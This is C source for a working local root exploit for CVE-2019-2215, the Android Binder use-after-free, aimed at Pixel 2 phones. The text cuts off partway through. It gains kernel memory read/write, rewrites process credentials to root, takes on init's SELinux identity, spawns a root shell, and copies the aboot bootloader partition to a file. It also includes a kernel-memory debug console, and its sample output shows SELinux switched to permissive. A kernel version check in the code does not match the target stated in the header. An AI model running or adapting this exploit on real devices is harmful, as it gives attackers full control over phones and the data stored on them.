/*
 * cve-2019-2215.c: Temproot for Pixel 2 and Pixel 2 XL via CVE-2019-2215
 *
 * Based on proof-of-concept by Jann Horn & Maddie Stone of Google Project Zero.
 * cf. https://bugs.chromium.org/p/project-zero/issues/detail?id=1942
 *
 * Description: Demonstration of a kernel memory R/W-only privilege escalation
 *              attack resulting in a temporary root shell.
 *
 *              Works on Google Pixel 2/Pixel 2 XL (walleye/taimen) devices
 *              running the QP1A.190711.020 image with kernel version-BuildID
 *              4.4.177-g83bee1dc48e8. For this tool to work on other devices or
 *              kernels affected by the same vulnerability, some offsets need to
 *              be found and changed.
 *
 *              Also includes a mini debug console from which it is possible to
 *              explore and modify kernel memory, as well as spawn a shell. Odd!
 *
 * Usage: Compile for AArch64 and run; all the source is in a single file on
 *        purpose. Tested with the cross-compiler toolchain in Android NDK r20.
 *
 *        Pass 'debug' as the sole cmdline argument to start the mini debug
 *        console instead of the privesc routine after kernel R/W is achieved.
 *
 * Sample output:
 *
 *  taimen:/ $ cd /data/local/tmp
 *  taimen:/data/local/tmp $ install -m 755 /sdcard/cve-2019-2215 ./
 *  taimen:/data/local/tmp $ ./cve-2019-2215
 *  Temproot for Pixel 2 and Pixel 2 XL via CVE-2019-2215
 *  [+] startup
 *  [+] find kernel address of current task_struct
 *  [+] obtain arbitrary kernel memory R/W
 *  [+] find kernel base address
 *  [+] bypass SELinux and patch current credentials
 *  taimen:/data/local/tmp # id
 *  uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),
 *  1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),
 *  3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:kernel:s0
 *  taimen:/data/local/tmp # getenforce
 *  Permissive
 *  taimen:/data/local/tmp # exit
 *  taimen:/data/local/tmp $
 *
 *  <-- snip -->
 *
 *  taimen:/data/local/tmp $ ./cve-2019-2215 debug
 *  Temproot for Pixel 2 and Pixel 2 XL via CVE-2019-2215
 *  [+] startup
 *  [+] find kernel address of current task_struct
 *  [+] obtain arbitrary kernel memory R/W
 *  [+] find kernel base address
 *  launching debug console, enter 'help' for quick help
 *  debug> print
 *  ffffff9bad880000 kernel_base
 *  ffffff9baf8a57d0 init_task
 *  ffffff9baf8af2c8 init_user_ns
 *  ffffff9baf8e3780 selinux_enabled
 *  ffffff9bafc4e4a8 selinux_enforcing
 *  ffffffe6b2942b80 current
 *  debug> write ffffff9bafc4e4a8 01 00 00 00
 *  debug> exit
 *  taimen:/data/local/tmp $ getenforce
 *  Enforcing
 *  taimen:/data/local/tmp $
 *
 */

#define _GNU_SOURCE
#include <ctype.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/sched.h>
#include <sched.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/un.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

typedef uint8_t u8;
typedef uint32_t u32;
typedef uint64_t u64;

// #include <linux/android/binder.h>
#define BINDER_THREAD_EXIT 0x40046208ul
// NOTE: we don't cover the task_struct* here; we want to leave it uninitialized
#ifndef PAGE_SIZE
#define PAGE_SIZE 0x1000
#endif

/* Data structure definitions as found in the Sep 2019 QP1A.190711.020 build of
 * Android 10 for walleye/taimen, kernel version-BuildID 4.4.177-g83bee1dc48e8.
 * Verified using `pahole` on a build of the official Android kernel/msm git:
 *
 *  https://android.googlesource.com/kernel/msm/+/refs/heads/android-msm-wahoo-4.4-android10
 *  (tree a4557a647a054b871bdf8e452a014cafa0ae5078)
 *
 * We leave only the fields in which we're interested, and we're really only
 * interested in their offsets; the others_* fields are padding.
 *
 *                            (<original type>           <offset> <size>)
 */
struct binder_thread {
    u8 others_0[160];
    u8 wait[24];           /*  wait_queue_head_t           160     24  */
    u8 others_1[216];
    // u8 others_1[224];   /* NOTE: see binder_iovecs below */
} __attribute__((packed)); /* size: 408 in kernel, 400 here */

struct task_struct {
    u8 others_0[1312];
    u64 mm;                /*  struct mm_struct *          1312    8   */
    u8 others_1[608];
    u64 real_cred;         /*  const struct cred *         1928    8   */
    u64 cred;              /*  const struct cred *         1936    8   */
    u8 others_2[1736];
} __attribute__((packed)); /* size: 3680 */

struct mm_struct {
    u8 others_0[768];
    u64 user_ns;           /*  struct user_namespace *     768     8   */
    u8 others_1[48];
} __attribute__((packed)); /* size: 824 */

struct cred {
    u8 others_0[4];
    u32 uid;               /*  kuid_t                      4       4   */
    u32 gid;               /*  kgid_t                      8       4   */
    u32 suid;              /*  kuid_t                      12      4   */
    u32 sgid;              /*  kgid_t                      16      4   */
    u32 euid;              /*  kuid_t                      20      4   */
    u32 egid;              /*  kgid_t                      24      4   */
    u32 fsuid;             /*  kuid_t                      28      4   */
    u32 fsgid;             /*  kgid_t                      32      4   */
    u32 securebits;        /*  unsigned int                36      4   */
    u64 cap_inheritable;   /*  kernel_cap_t                40      8   */
    u64 cap_permitted;     /*  kernel_cap_t                48      8   */
    u64 cap_effective;     /*  kernel_cap_t                56      8   */
    u64 cap_bset;          /*  kernel_cap_t                64      8   */
    u64 cap_ambient;       /*  kernel_cap_t                72      8   */
    u8 others_1[40];
    u64 security;          /*  void *                      120     8   */
    u8 others_2[40];
} __attribute__((packed)); /* size: 168 */

struct task_security_struct {
    u32 osid;              /*  u32                         0       4   */
    u32 sid;               /*  u32                         4       4   */
    u32 exec_sid;          /*  u32                         8       4   */
    u32 create_sid;        /*  u32                         12      4   */
    u32 keycreate_sid;     /*  u32                         16      4   */
    u32 sockcreate_sid;    /*  u32                         20      4   */
} __attribute__((packed)); /* size: 24 */

/* Kernel symbol table offsets, relative to _head, in the QP1A.190711.020
 * walleye/taimen kernel. The SELinux-related offsets were determined with
 * reference to System.map and a minor bit of trial-and-error.
 */
const ptrdiff_t ksym_init_task = 0x20257d0;
const ptrdiff_t ksym_init_user_ns = 0x202f2c8;
const ptrdiff_t ksym_selinux_enabled = 0x2063780;
const ptrdiff_t ksym_selinux_enforcing = 0x23ce4a8;

/* The exploit relies upon a use-after-free by the kernel's epoll cleanup code
 * resulting from an oversight in Android's Binder IPC subsystem, fixed here:
 *
 *  https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b
 *
 * In the original Project Zero POC, arrays of 25 `struct iovec`s are treated
 * as `struct binder_thread`s by the kernel. We do the same here via a union,
 * which hopefully clarifies where the #defines of 25 and 10 came from in the
 * original POC. Since we're using structure definitions for offsets only, we're
 * fine cutting off 8 bytes from our definition of a `struct binder_thread` to
 * ensure `sizeof(binder_iovecs) == sizeof(struct iovec[25]) == 400`.
 */
const size_t iovs_sz = sizeof(struct binder_thread) / sizeof(struct iovec);
const size_t iov_idx = offsetof(struct binder_thread, wait) / sizeof(struct iovec);
typedef union {
    struct binder_thread bt;
    struct iovec iovs[iovs_sz];
} binder_iovecs;

void kwrite(u64 kaddr, void *buf, size_t len);
void kread(u64 kaddr, void *buf, size_t len);
void kwrite_u64(u64 kaddr, u64 data);
void kwrite_u32(u64 kaddr, u32 data);
u64 kread_u64(u64 kaddr);
u64 kread_u32(u64 kaddr);

void prepare_globals(void);
void find_current(void);
void obtain_kernel_rw(void);
void scan_dynamic_creds(void);
void scan_init_sid(void);
void dump_aboot_via_child(void);
void temporary_root_shell(const char *command);
void patch_dynamic_creds_and_dump_aboot(void);
void find_kernel_base(void);
void patch_creds(void);
void launch_shell(void);
void launch_debug_console(void);

void con_loop(void);
int con_consume(char **token);
int con_parse_hexstring(char *token, u64 *val);
int con_parse_number(char *token, u64 *val);
int con_parse_hexbytes(char **token, u8 **data, size_t *len);
void con_kdump(u64 kaddr, size_t len);

void execute_stage(int op);
void notify_stage_failure(void);
extern char *stage_desc;

int main(int argc, char *argv[]);

pid_t pid;
int debugging;
void *dummy_page;
int kernel_rw_pipe[2];
int binder_fd;
int epoll_fd;

u64 current;
u64 kernel_base;
static u64 dynamic_cred;
static u64 dynamic_security;
static size_t dynamic_cred_task_off;
static u32 dynamic_init_sid;
static size_t dynamic_pid_off;
static size_t dynamic_tasks_off;
static u64 dynamic_init_cred;

static int kread_try(u64 kaddr, void *buf, size_t len) {
    ssize_t n = write(kernel_rw_pipe[1], (void *)kaddr, len);
    if (n != (ssize_t)len)
        return -1;
    n = read(kernel_rw_pipe[0], buf, len);
    return n == (ssize_t)len ? 0 : -1;
}

void scan_dynamic_creds(void) {
    const u32 expected_uid = (u32)getuid();
    u8 task_page[PAGE_SIZE];
    int matches = 0;

    printf("[i] scanning current task_struct for cred pair (uid=%u)\n",
           expected_uid);
    for (size_t page_off = 0; page_off < PAGE_SIZE; page_off += PAGE_SIZE) {
        kread(current + page_off, task_page, sizeof(task_page));
        for (size_t off = 0; off + 16 <= sizeof(task_page); off += 8) {
            u64 first = *(u64 *)(task_page + off);
            u64 second = *(u64 *)(task_page + off + 8);
            if (first != second ||
                (first & 0xffff000000000000ULL) != 0xffff000000000000ULL)
                continue;

            u8 cred_buf[0x120];
            if (kread_try(first, cred_buf, sizeof(cred_buf)))
                continue;
            const u32 *cred32 = (const u32 *)cred_buf;
            int uid_match = 1;
            for (size_t i = 1; i <= 8; i++)
                if (cred32[i] != expected_uid)
                    uid_match = 0;
            if (!uid_match)
                continue;

            matches++;
            dynamic_cred = first;
            dynamic_cred_task_off = page_off + off;
            printf("[+] cred pair: task+0x%lx -> 0x%016lx\n",
                   page_off + off, first);
            printf("[+] cred ids: usage=%u uid/gid/suid/sgid/euid/egid/fsuid/fsgid=",
                   cred32[0]);
            for (size_t i = 1; i <= 8; i++)
                printf("%s%u", i == 1 ? "" : "/", cred32[i]);
            putchar('\n');

            for (size_t sec_off = 0x50; sec_off <= 0x100; sec_off += 8) {
                u64 sec_ptr = *(u64 *)(cred_buf + sec_off);
                if ((sec_ptr & 0xffff000000000000ULL) !=
                    0xffff000000000000ULL)
                    continue;
                u32 sec[6];
                if (kread_try(sec_ptr, sec, sizeof(sec)))
                    continue;
                if (sec[0] && sec[0] == sec[1] && sec[0] < 1024 &&
                    sec[2] < 1024 && sec[3] < 1024 &&
                    sec[4] < 1024 && sec[5] < 1024) {
                    printf("[+] security candidate: cred+0x%lx -> 0x%016lx "
                           "osid/sid/exec/create/key/sock=%u/%u/%u/%u/%u/%u\n",
                           sec_off, sec_ptr, sec[0], sec[1], sec[2], sec[3],
                           sec[4], sec[5]);
                    dynamic_security = sec_ptr;
                }
            }
        }
    }
    if (!matches)
        errx(1, "no validated cred pair found");
    printf("[+] validated cred matches: %d\n", matches);
}

static int canonical_ptr(u64 ptr) {
    return (ptr & 0xffff000000000000ULL) == 0xffff000000000000ULL;
}

void scan_init_sid(void) {
    scan_dynamic_creds();
    u8 task_buf[PAGE_SIZE];
    kread(current, task_buf, sizeof(task_buf));
    u32 self_pid = (u32)getpid();
    size_t pid_off = 0;
    size_t tasks_off = 0;
    u64 init_task = 0;

    for (size_t po = 0; po + 8 <= sizeof(task_buf); po += 4) {
        if (*(u32 *)(task_buf + po) != self_pid ||
            *(u32 *)(task_buf + po + 4) != self_pid)
            continue;
        printf("[i] pid/tgid candidate at task+0x%lx\n", po);
        for (size_t lo = 0; lo + 16 <= sizeof(task_buf); lo += 8) {
            u64 next = *(u64 *)(task_buf + lo);
            u64 prev = *(u64 *)(task_buf + lo + 8);
            if (!canonical_ptr(next) || !canonical_ptr(prev) || next == prev)
                continue;
            u64 neighbor = next - lo;
            u32 neighbor_ids[2];
            u64 neighbor_links[2];
            if (!canonical_ptr(neighbor) ||
                kread_try(neighbor + po, neighbor_ids, sizeof(neighbor_ids)) ||
                kread_try(neighbor + lo, neighbor_links, sizeof(neighbor_links)))
                continue;
            if (!neighbor_ids[0] || neighbor_ids[0] > 100000 ||
                neighbor_ids[0] != neighbor_ids[1] ||
                neighbor_links[1] != current + lo ||
                !canonical_ptr(neighbor_links[0]))
                continue;
            u64 node = next;
            for (size_t n = 0; n < 4096 && node != current + lo; n++) {
                u64 task = node - lo;
                u32 ids[2];
                u64 next_node;
                if (kread_try(task + po, ids, sizeof(ids)) ||
                    kread_try(node, &next_node, sizeof(next_node)) ||
                    !canonical_ptr(next_node))
                    break;
                if (ids[0] == 1 && ids[1] == 1) {
                    pid_off = po;
                    tasks_off = lo;
                    init_task = task;
                    printf("[+] tasks list at task+0x%lx, next pid=%u\n",
                           tasks_off, neighbor_ids[0]);
                    goto init_found;
                }
                node = next_node;
            }
        }
    }
init_found:
    if (!tasks_off || !init_task)
        errx(1, "unable to identify task list dynamically");
    printf("[+] init task_struct: 0x%016lx (pid off 0x%lx)\n",
           init_task, pid_off);

    u64 init_creds[2];
    kread(init_task + dynamic_cred_task_off, init_creds, sizeof(init_creds));
    if (init_creds[0] != init_creds[1] || !canonical_ptr(init_creds[0]))
        errx(1, "PID 1 cred pair validation failed");
    u8 cred_buf[0x120];
    kread(init_creds[0], cred_buf, sizeof(cred_buf));
    const u32 *ids = (const u32 *)cred_buf;
    for (size_t i = 1; i <= 8; i++)
        if (ids[i] != 0)
            errx(1, "PID 1 cred ID validation failed");

    u64 sec_ptr = *(u64 *)(cred_buf + 0x78);
    u32 sec[6];
    if (!canonical_ptr(sec_ptr) || kread_try(sec_ptr, sec, sizeof(sec)))
        errx(1, "PID 1 security structure validation failed");
    printf("[i] PID 1 raw security: ptr=0x%016lx values=%u/%u/%u/%u/%u/%u\n",
           sec_ptr, sec[0], sec[1], sec[2], sec[3], sec[4], sec[5]);
    if (!sec[1] || sec[0] >= 4096 || sec[1] >= 4096 ||
        sec[2] >= 4096 || sec[3] >= 4096 ||
        sec[4] >= 4096 || sec[5] >= 4096)
        errx(1, "PID 1 security values are implausible");
    dynamic_init_sid = sec[1];
    dynamic_pid_off = pid_off;
    dynamic_tasks_off = tasks_off;
    dynamic_init_cred = init_creds[0];
    printf("[+] init cred: 0x%016lx security: 0x%016lx "
           "osid/sid/exec/create/key/sock=%u/%u/%u/%u/%u/%u\n",
           init_creds[0], sec_ptr, sec[0], sec[1], sec[2], sec[3], sec[4],
           sec[5]);
}

static u64 find_task_by_pid(u32 wanted_pid) {
    u64 node = kread_u64(current + dynamic_tasks_off);
    for (size_t n = 0; n < 4096 && node != current + dynamic_tasks_off; n++) {
        u64 task = node - dynamic_tasks_off;
        u32 ids[2];
        if (kread_try(task + dynamic_pid_off, ids, sizeof(ids)))
            return 0;
        if (ids[0] == wanted_pid)
            return task;
        node = kread_u64(node);
    }
    return 0;
}

struct dump_shared {
    volatile int state;
    volatile int error_stage;
    volatile int error_no;
    volatile u32 observed_uid;
    volatile u32 observed_gid;
    volatile size_t bytes;
};

struct root_shared {
    volatile int state;
    volatile int error_stage;
    volatile int error_no;
    volatile u32 observed_uid;
    volatile u32 observed_gid;
    volatile int command_status;
    char command[1024];
};

static volatile sig_atomic_t root_stop;

static void root_stop_handler(int signal_no) {
    (void)signal_no;
    root_stop = 1;
}

static int run_android_shell_command(const char *command) {
    pid_t command_pid = fork();
    if (command_pid < 0)
        return -1;
    if (command_pid == 0) {
        signal(SIGINT, SIG_DFL);
        signal(SIGTERM, SIG_DFL);
        signal(SIGHUP, SIG_DFL);
        execl("/system/bin/sh", "sh", "-c", command, (char *)NULL);
        _exit(127);
    }
    int status;
    if (waitpid(command_pid, &status, 0) != command_pid)
        return -1;
    return status;
}

static void publish_state(struct dump_shared *shared, int state) {
    __sync_synchronize();
    shared->state = state;
    __sync_synchronize();
}

static void wait_state(struct dump_shared *shared, int state) {
    while (shared->state != state && shared->state >= 0)
        sched_yield();
}

static void dump_child(struct dump_shared *shared) {
    const char *src_path = "/dev/block/mmcblk0p19";
    const char *dst_path = "/data/local/tmp/aboot.img";
    const size_t expected = 0x100000;
    int dst = open(dst_path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
    u8 *image = malloc(expected);
    if (dst < 0 || !image) {
        shared->error_stage = 1;
        shared->error_no = errno;
        publish_state(shared, -1);
        _exit(1);
    }
    publish_state(shared, 1); /* destination ready under shell cred */
    wait_state(shared, 2);    /* parent installed init cred */

    shared->observed_uid = (u32)getuid();
    shared->observed_gid = (u32)getgid();
    int src = open(src_path, O_RDONLY | O_CLOEXEC);
    if (src < 0) {
        shared->error_stage = 2;
        shared->error_no = errno;
        publish_state(shared, -1);
        while (shared->state != 6)
            sched_yield();
        _exit(2);
    }
    size_t total = 0;
    while (total < expected) {
        size_t want = expected - total;
        if (want > 0x10000)
            want = 0x10000;
        ssize_t nr = read(src, image + total, want);
        if (nr <= 0) {
            shared->error_stage = 3;
            shared->error_no = errno;
            publish_state(shared, -1);
            while (shared->state != 6)
                sched_yield();
            _exit(3);
        }
        total += (size_t)nr;
    }
    close(src);
    shared->bytes = total;
    publish_state(shared, 3); /* block read complete; request cred restore */
    wait_state(shared, 4);    /* parent restored shell cred */

    total = 0;
    while (total < expected) {
        ssize_t nw = write(dst, image + total, expected - total);
        if (nw <= 0) {
            shared->error_stage = 4;
            shared->error_no = errno;
            publish_state(shared, -1);
            while (shared->state != 6)
                sched_yield();
            _exit(4);
        }
        total += (size_t)nw;
    }
    fsync(dst);
    close(dst);
    free(image);
    shared->bytes = total;
    publish_state(shared, 5); /* file write complete */
    wait_state(shared, 6);
    _exit(0);
}

void dump_aboot_via_child(void) {
    struct dump_shared *shared = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
        MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (shared == MAP_FAILED)
        err(1, "shared dump state mmap");
    memset(shared, 0, PAGE_SIZE);

    pid_t child = fork();
    if (child < 0)
        err(1, "fork dump child");
    if (child == 0)
        dump_child(shared);
    wait_state(shared, 1);
    if (shared->state < 0)
        errx(1, "dump child setup failed stage=%d errno=%d",
             shared->error_stage, shared->error_no);

    execute_stage(2); /* parent obtains kernel R/W; child retains USER_DS */
    scan_init_sid();
    u64 child_task = find_task_by_pid((u32)child);
    if (!child_task)
        errx(1, "dump child task_struct not found");
    u64 child_creds[2];
    kread(child_task + dynamic_cred_task_off, child_creds, sizeof(child_creds));
    if (child_creds[0] != child_creds[1] || !canonical_ptr(child_creds[0]))
        errx(1, "dump child cred pair invalid");
    printf("[+] child task=0x%016lx old_cred=0x%016lx init_cred=0x%016lx\n",
           child_task, child_creds[0], dynamic_init_cred);

    u64 init_pair[2] = {dynamic_init_cred, dynamic_init_cred};
    kwrite(child_task + dynamic_cred_task_off, init_pair, sizeof(init_pair));
    publish_state(shared, 2);
    while (shared->state == 2)
        sched_yield();

    /* Restore the child's exact original cred pointers before allowing file
     * output or process exit. */
    kwrite(child_task + dynamic_cred_task_off, child_creds, sizeof(child_creds));
    if (shared->state < 0) {
        printf("[-] child block stage failed: stage=%d errno=%d uid=%u gid=%u\n",
               shared->error_stage, shared->error_no,
               shared->observed_uid, shared->observed_gid);
        publish_state(shared, 6);
        waitpid(child, NULL, 0);
        errx(1, "child block read failed");
    }
    printf("[+] child read %lu bytes as uid=%u gid=%u\n", shared->bytes,
           shared->observed_uid, shared->observed_gid);
    publish_state(shared, 4);
    while (shared->state == 4)
        sched_yield();
    if (shared->state < 0) {
        printf("[-] child file stage failed: stage=%d errno=%d\n",
               shared->error_stage, shared->error_no);
        publish_state(shared, 6);
        waitpid(child, NULL, 0);
        errx(1, "child file write failed");
    }
    printf("[+] child wrote %lu bytes\n", shared->bytes);
    publish_state(shared, 6);
    waitpid(child, NULL, 0);
    munmap(shared, PAGE_SIZE);
}

static void root_child(struct root_shared *shared) {
    signal(SIGINT, root_stop_handler);
    signal(SIGTERM, root_stop_handler);
    signal(SIGHUP, root_stop_handler);
    /* Force a private cred object without changing any IDs. */
    (void)setresgid((gid_t)-1, (gid_t)-1, (gid_t)-1);
    (void)setresuid((uid_t)-1, (uid_t)-1, (uid_t)-1);
    publish_state((struct dump_shared *)shared, 1);
    while (shared->state != 2 && shared->state >= 0)
        sched_yield();

    shared->observed_uid = (u32)getuid();
    shared->observed_gid = (u32)getgid();
    publish_state((struct dump_shared *)shared, 3);

    if (shared->command[0]) {
        shared->command_status = run_android_shell_command(shared->command);
    } else {
        char line[1024];
        printf("\nCube temporary root shell (type 'exit' to restore)\n");
        while (!root_stop) {
            printf("cube-root# ");
            fflush(stdout);
            if (!fgets(line, sizeof(line), stdin))
                break;
            line[strcspn(line, "\r\n")] = '\0';
            if (!strcmp(line, "exit") || !strcmp(line, "quit"))
                break;
            if (!strncmp(line, "cd ", 3)) {
                if (chdir(line + 3))
                    perror("cd");
                continue;
            }
            if (!line[0])
                continue;
            shared->command_status = run_android_shell_command(line);
        }
    }

    publish_state((struct dump_shared *)shared, 5);
    while (shared->state != 6)
        sched_yield();
    _exit(0);
}

void temporary_root_shell(const char *command) {
    struct root_shared *shared = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
        MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (shared == MAP_FAILED)
        err(1, "shared root state mmap");
    memset(shared, 0, PAGE_SIZE);
    if (command)
        snprintf(shared->command, sizeof(shared->command), "%s", command);

    pid_t child = fork();
    if (child < 0)
        err(1, "fork root child");
    if (child == 0)
        root_child(shared);
    while (shared->state == 0)
        sched_yield();

    signal(SIGINT, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    execute_stage(2);
    scan_init_sid();
    u64 child_task = find_task_by_pid((u32)child);
    if (!child_task)
        errx(1, "root child task_struct not found");
    u64 old_creds[2];
    kread(child_task + dynamic_cred_task_off, old_creds, sizeof(old_creds));
    if (old_creds[0] != old_creds[1] || !canonical_ptr(old_creds[0]))
        errx(1, "root child cred pair invalid");
    printf("[i] root child private cred=0x%016lx parent cred=0x%016lx\n",
           old_creds[0], dynamic_cred);
    if (old_creds[0] == dynamic_cred)
        errx(1, "root child did not obtain a private cred object");
    u8 original_cred[80];
    kread(old_creds[0], original_cred, sizeof(original_cred));
    const u32 *old_ids = (const u32 *)original_cred;
    for (size_t i = 1; i <= 8; i++)
        if (old_ids[i] != 2000)
            errx(1, "root child private cred ID validation failed");
    for (size_t off = 4; off <= 32; off += 4)
        kwrite_u32(old_creds[0] + off, 0);
    kwrite_u32(old_creds[0] + 36, 0);
    for (size_t off = 40; off <= 72; off += 8)
        kwrite_u64(old_creds[0] + off, ~(u64)0);
    publish_state((struct dump_shared *)shared, 2);

    while (shared->state == 2 || shared->state == 3)
        sched_yield();
    kwrite(old_creds[0] + 4, original_cred + 4, 76);

    if (shared->state < 0) {
        printf("[-] root child failed: stage=%d errno=%d uid=%u gid=%u\n",
               shared->error_stage, shared->error_no,
               shared->observed_uid, shared->observed_gid);
        publish_state((struct dump_shared *)shared, 6);
        waitpid(child, NULL, 0);
        errx(1, "temporary root setup failed");
    }
    printf("[+] temporary root session finished (uid=%u gid=%u status=%d)\n",
           shared->observed_uid, shared->observed_gid,
           shared->command_status);
    publish_state((struct dump_shared *)shared, 6);
    waitpid(child, NULL, 0);
    munmap(shared, PAGE_SIZE);
    stage_desc = NULL;
}

void patch_dynamic_creds_and_dump_aboot(void) {
    const char *src_path = "/dev/block/mmcblk0p19";
    const char *dst_path = "/data/local/tmp/aboot.img";
    const size_t expected = 0x100000;

    /* Create the destination while still in the shell SELinux domain. The
     * later kernel-domain context may not be permitted to create a
     * shell_data_file, but can continue using this already-open descriptor. */
    int dst = open(dst_path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
    if (dst < 0)
        err(1, "create aboot image before credential patch");
    u8 *image = malloc(expected);
    if (!image)
        err(1, "allocate aboot image buffer");

    scan_init_sid();
    if (!dynamic_cred || !dynamic_security || !dynamic_init_sid)
        errx(1, "validated cred/security/init SID unavailable");
    prctl(PR_SET_NAME, "cred-found");

    /* struct cred layout was validated above by the eight ID fields and the
     * task_security_struct signature. These offsets match this kernel at
     * runtime; no kernel symbol or KASLR offset is used here. */
    for (size_t off = 4; off <= 32; off += 4)
        kwrite_u32(dynamic_cred + off, 0);
    kwrite_u32(dynamic_cred + 36, 0); /* securebits */
    for (size_t off = 40; off <= 72; off += 8)
        kwrite_u64(dynamic_cred + off, ~(u64)0);

    /* Match PID 1's observed osid/sid (1/init SID) without changing global
     * selinux_enforcing. */
    kwrite_u32(dynamic_security + 0, 1);
    kwrite_u32(dynamic_security + 4, dynamic_init_sid);
    prctl(PR_SET_NAME, "init-patched");

    printf("[+] patched identity: uid=%u gid=%u\n", getuid(), getgid());
    if (getuid() != 0 || getgid() != 0)
        errx(1, "credential patch validation failed");

    int src = open(src_path, O_RDONLY | O_CLOEXEC);
    if (src < 0) {
        char fail_name[16];
        snprintf(fail_name, sizeof(fail_name), "open-errno-%d", errno);
        prctl(PR_SET_NAME, fail_name);
        _exit(100 + errno);
    }
    prctl(PR_SET_NAME, "aboot-open");

    /* CONFIG_ARM64_VA_BITS=39. With UAO enabled, normal block-device
     * usercopy must run with USER_DS rather than the KERNEL_DS value used by
     * the pipe-based kernel R/W primitive. This is deliberately the final
     * kernel write in this process. */
    kwrite_u64(current + 8, 0x0000007fffffffffULL);
    prctl(PR_SET_NAME, "userds-set");

    size_t total = 0;
    while (total < expected) {
        size_t want = expected - total;
        if (want > 0x10000)
            want = 0x10000;
        ssize_t nr = read(src, image + total, want);
        if (nr <= 0)
            err(1, "read aboot block device at 0x%lx", total);
        total += (size_t)nr;
    }
    close(src);
    prctl(PR_SET_NAME, "read-done");

    total = 0;
    while (total < expected) {
        size_t done = 0;
        size_t chunk = expected - total;
        if (chunk > 0x10000)
            chunk = 0x10000;
        while (done < chunk) {
            ssize_t nw = write(dst, image + total + done, chunk - done);
            if (nw <= 0)
                err(1, "write aboot image at 0x%lx", total + done);
            done += (size_t)nw;
        }
        total += chunk;
    }
    fsync(dst);
    close(dst);
    free(image);
    prctl(PR_SET_NAME, "write-done");

    printf("[+] dumped %lu bytes from %s to %s\n", total, src_path, dst_path);
}

void kwrite(u64 kaddr, void *buf, size_t len) {
    errno = 0;
    if (len > PAGE_SIZE)
        errx(1, "kernel writes over PAGE_SIZE are messy, tried 0x%lx", len);
    if (write(kernel_rw_pipe[1], buf, len) != (ssize_t)len)
        err(1, "kwrite failed to load userspace buffer");
    if (read(kernel_rw_pipe[0], (void *)kaddr, len) != (ssize_t)len)
        err(1, "kwrite failed to overwrite kernel memory");
}
void kread(u64 kaddr, void *buf, size_t len) {
    errno = 0;
    if (len > PAGE_SIZE)
        errx(1, "kernel reads over PAGE_SIZE are messy, tried 0x%lx", len);
    if (write(kernel_rw_pipe[1], (void *)kaddr, len) != (ssize_t)len)
        err(1, "kread failed to read kernel memory");
    if (read(kernel_rw_pipe[0], buf, len) != (ssize_t)len)
        err(1, "kread failed to write out to userspace");
}
u64 kread_u64(u64 kaddr) {
    u64 data;
    kread(kaddr, &data, sizeof(data));
    return data;
}
u64 kread_u32(u64 kaddr) {
    u32 data;
    kread(kaddr, &data, sizeof(data));
    return data;
}
void kwrite_u64(u64 kaddr, u64 data) {
    kwrite(kaddr, &data, sizeof(data));
}
void kwrite_u32(u64 kaddr, u32 data) {
    kwrite(kaddr, &data, sizeof(data));
}

void prepare_globals(void) {
    pid = getpid();

    struct utsname kernel_info;
    if (uname(&kernel_info) == -1)
        err(1, "determine kernel release");
    if (strcmp(kernel_info.release, "4.9.82-perf"))
        warnx("target kernel release is not '4.9.82-perf'");

    dummy_page = mmap((void *)0x100000000ul, 2 * PAGE_SIZE,
                      PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (dummy_page != (void *)0x100000000ul)
        err(1, "mmap 4g aligned");
    if (pipe(kernel_rw_pipe))
        err(1, "kernel_rw_pipe");

    binder_fd = open("/dev/binder", O_RDONLY);
    epoll_fd = epoll_create(1000);
}
void find_current(void) {
    /* Originally: void leak_task_struct(void); */
    struct epoll_event event = {.events = EPOLLIN};
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &event))
        err(1, "epoll_add");

    binder_iovecs bio;
    memset(&bio, 0, sizeof(bio));
    bio.iovs[iov_idx].iov_base = dummy_page;             /* spinlock in the low address half must be zero */
    bio.iovs[iov_idx].iov_len = PAGE_SIZE;               /* wq->task_list->next */
    bio.iovs[iov_idx + 1].iov_base = (void *)0xdeadbeef; /* wq->task_list->prev */
    bio.iovs[iov_idx + 1].iov_len = PAGE_SIZE;

    int pipe_fd[2];
    if (pipe(pipe_fd))
        err(1, "pipe");
    if (fcntl(pipe_fd[0], F_SETPIPE_SZ, PAGE_SIZE) != PAGE_SIZE)
        err(1, "pipe size");
    static char page_buffer[PAGE_SIZE];

    pid = fork();
    if (pid == -1)
        err(1, "fork");
    if (pid == 0) {
        /* Child process */
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        sleep(2);
        epoll_ctl(epoll_fd, EPOLL_CTL_DEL, binder_fd, &event);
        // first page: dummy data
        if (read(pipe_fd[0], page_buffer, PAGE_SIZE) != PAGE_SIZE)
            err(1, "read full pipe");
        close(pipe_fd[1]);
        exit(0);
    }

    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
    ssize_t writev_ret = writev(pipe_fd[1], bio.iovs, iovs_sz);
    if (writev_ret != (ssize_t)(2 * PAGE_SIZE))
        errx(1, "writev() returns 0x%lx, expected 0x%lx\n",
             writev_ret, (ssize_t)(2 * PAGE_SIZE));
    // second page: leaked data
    if (read(pipe_fd[0], page_buffer, PAGE_SIZE) != PAGE_SIZE)
        err(1, "read full pipe");

    pid_t status;
    if (wait(&status) != pid)
        err(1, "wait");

